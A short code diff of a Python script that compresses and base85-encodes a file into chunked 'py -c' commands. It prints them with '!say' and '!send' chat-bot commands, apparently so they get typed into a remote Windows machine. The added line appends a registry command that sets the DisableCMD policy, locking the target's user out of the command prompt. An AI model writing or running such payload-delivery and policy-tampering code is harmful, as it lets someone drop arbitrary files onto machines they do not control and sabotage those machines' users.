@@ -64,7 +64,7 @@ def encode_and_split(filename, chunk_size=CHUNK_SIZE):
     encoded = base64.b85encode(data).decode('ascii')
     
     # FULL CMD
-    full_cmd = f"py -c \"import base64, lzma, io; m = lzma.decompress(base64.b85decode('{encoded}')); open('{filename_mid}', 'wb').write(m)\""
+    full_cmd = f"py -c \"import base64, lzma; m = lzma.decompress(base64.b85decode('{encoded}')); open('{filename_mid}', 'wb').write(m)\""
     print(f"=== Файл: {filename} ===")
     print(f"length of base85: {len(encoded)} symbols")
     print(f"length of command: {len(full_cmd)} symbols")
@@ -75,6 +75,6 @@ def encode_and_split(filename, chunk_size=CHUNK_SIZE):
     for i, start in enumerate(range(0, len(full_cmd), chunk_size)):
         chunk = full_cmd[start:start + chunk_size]
         print(f"!say {chunk}")
-    print(f'!combo !send !send mplay32 /play "{filename_mid}"\n')
-    print('debug:',full_cmd)
+    print(f'!combo !send !send mplay32 /play "{filename_mid}" !send reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 1 /f"\n')
+    #print('debug:',full_cmd)
 encode_and_split(YOURXZWITHMIDI)
